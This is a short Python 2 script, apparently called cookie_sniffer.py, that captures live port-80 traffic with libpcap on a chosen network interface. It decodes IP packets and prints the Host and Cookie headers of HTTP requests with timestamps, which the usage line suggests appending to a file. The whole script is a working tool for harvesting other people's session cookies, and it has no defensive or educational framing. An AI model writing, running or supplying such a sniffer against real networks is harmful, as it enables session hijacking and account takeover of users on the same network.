#!/usr/bin/env python2

import pcap
import sys
import string
import time
import socket
import struct
import binascii
import re
import os
import datetime

protocols={socket.IPPROTO_TCP:'tcp',
           socket.IPPROTO_UDP:'udp',
           socket.IPPROTO_ICMP:'icmp'}

def decode_ip_packet(s):
  d={}
  d['version']=(ord(s[0]) & 0xf0) >> 4
  d['header_len']=ord(s[0]) & 0x0f
  d['tos']=ord(s[1])
  d['total_len']=socket.ntohs(struct.unpack('H',s[2:4])[0])
  d['id']=socket.ntohs(struct.unpack('H',s[4:6])[0])
  d['flags']=(ord(s[6]) & 0xe0) >> 5
  d['fragment_offset']=socket.ntohs(struct.unpack('H',s[6:8])[0] & 0x1f)
  d['ttl']=ord(s[8])
  d['protocol']=ord(s[9])
  d['checksum']=socket.ntohs(struct.unpack('H',s[10:12])[0])
  d['source_address']=pcap.ntoa(struct.unpack('i',s[12:16])[0])
  d['destination_address']=pcap.ntoa(struct.unpack('i',s[16:20])[0])
  if d['header_len']>5:
    d['options']=s[20:4*(d['header_len']-5)]
  else:
    d['options']=None
  d['data']=s[4*d['header_len']:]
  return d

class myhttpdump():
  def __init__(self):
    self.header_host = ''
    self.header_cookie = ''
  def dumphex(self, s):
    bytes = map(lambda x: '%.2x' % x, map(ord, s))

    re_host = re.compile(r"(Host: .*)")
    re_cookie = re.compile(r"(Cookie: .*)")

    for data in binascii.unhexlify(''.join(bytes[0:len(bytes)])).split('\r\n'):
      if re_host.search(data):
        self.header_host = re_host.search(data).group(0)
      elif re_cookie.search(data):
        self.header_cookie = re_cookie.search(data).group(0)
        print datetime.datetime.now().strftime("%Y/%m/%d/ %H:%M:%S")
        print self.header_host + '\n' + self.header_cookie + '\n\n'

def print_packet(pktlen, data, timestamp):
  if not data:
    return

  if data[12:14]=='\x08\x00':
    decoded=decode_ip_packet(data[14:])
#    print '\n%s.%f %s > %s' % (time.strftime('%H:%M',
#                                           time.localtime(timestamp)),
#                             timestamp % 60,
#                             decoded['source_address'],
#                             decoded['destination_address'])
#    for key in ['version', 'header_len', 'tos', 'total_len', 'id',
#                'flags', 'fragment_offset', 'ttl']:
#      print '  %s: %d' % (key, decoded[key])
#    print '  protocol: %s' % protocols[decoded['protocol']]
#    print '  header checksum: %d' % decoded['checksum']
#    print '  data:'
    #dumphex(decoded['data'])
    http = myhttpdump()
    http.dumphex(decoded['data'])
 
if __name__=='__main__':
    if len(sys.argv) == 2:
        p = pcap.pcapObject()
        dev = sys.argv[1]
        net, mask = pcap.lookupnet(dev)
        p.open_live(dev, 1600, 0, 100)
        filter_string = 'port 80'
        p.setfilter(filter_string, 0, 0)
      
        try:
          while 1:
            p.dispatch(1, print_packet)
        except KeyboardInterrupt:
          print '%s' % sys.exc_type
          print 'shutting down'
          print '%d packets received, %d packets dropped, %d packets dropped by interface' % p.stats()
    else:
        print 'usage:\n    # cookie_sniffer.py <interface> >> outputfile'
        exit(10)

exit(1)

  

